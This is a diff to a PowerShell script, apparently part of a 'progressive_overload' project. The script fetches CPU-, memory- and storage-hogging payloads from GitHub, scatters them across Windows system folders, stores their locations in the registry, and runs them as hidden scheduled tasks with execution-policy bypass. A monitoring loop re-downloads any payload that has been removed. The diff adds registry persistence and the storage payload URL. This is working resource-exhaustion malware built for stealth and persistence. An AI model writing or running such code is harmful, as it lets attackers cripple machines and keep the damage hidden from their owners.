@@ -1,6 +1,11 @@
+param([string]$basePath)
+
 $cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.ps1"
 $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.ps1"
-$storageHogUri = "STORAGE_HOG_URI"
+$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.ps1"
+$memPropertyName = "mem"
+$storagePropertyName = "store"
+
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32",
@@ -24,15 +29,26 @@ $paths = @(
     "$env:windir\ServiceProfiles\NetworkService"
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami3.txt`""
-$idx = Get-Random -Minimum 0 -Maximum $paths.Length
-$memHogPath = $paths[$idx]
-$memHogPath = "$memHogPath\mem_hog.ps1"
-iwr -Uri $memHogUri -OutFile $memHogPath
 
-$idx = Get-Random -Minimum 0 -Maximum $paths.Length
-$storageHogPath = $paths[$idx]
-$storageHogPath = "$storageHogPath\storage_hog.ps1"
-# iwr -Uri $storageHogUri -OutFile $storageHogPath
+$itemMem = Get-ItemProperty -Path $basePath -Name $memPropertyName -ErrorAction SilentlyContinue
+
+if(-not($itemMem)){
+    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+    $memHogPath = $paths[$idx]
+    $memHogPath = "$memHogPath\mem_hog.ps1"
+    iwr -Uri $memHogUri -OutFile $memHogPath
+    Set-ItemProperty -Path $basePath -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+}else { $memHogPath = $itemMem.$memPropertyName }
+
+# $itemStore = Get-ItemProperty -Path $basePath -Name $storagePropertyName -ErrorAction SilentlyContinue
+
+# if(-not($itemStore)){
+#     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+#     $storageHogPath = $paths[$idx]
+#     $storageHogPath = "$storageHogPath\storage_hog.ps1"
+#     iwr -Uri $storageHogUri -OutFile $storageHogPath
+#     Set-ItemProperty -Path $basePath -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
+# }else { $storageHogPath = $itemStore.$storagePropertyName }
 
 $threshold = Get-Random -Minimum 80 -Maximum 86
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -91,8 +107,7 @@ while ($true) {
 
     if(-not(Test-Path $memHogPath -PathType Leaf)){
         schtasks /end /tn $memHogTaskName
-        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
-        $memHogPath = $paths[$idx]
+        $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
         $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
@@ -101,8 +116,7 @@ while ($true) {
     }
     # if(-not(Test-Path $storageHogPath -PathType Leaf)){
     #     schtasks /end /tn $storageHogTaskName
-    #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
-    #     $storageHogPath = $paths[$idx]
+    #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
     #     iwr -Uri $storageHogUri -OutFile $storageHogPath
     #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
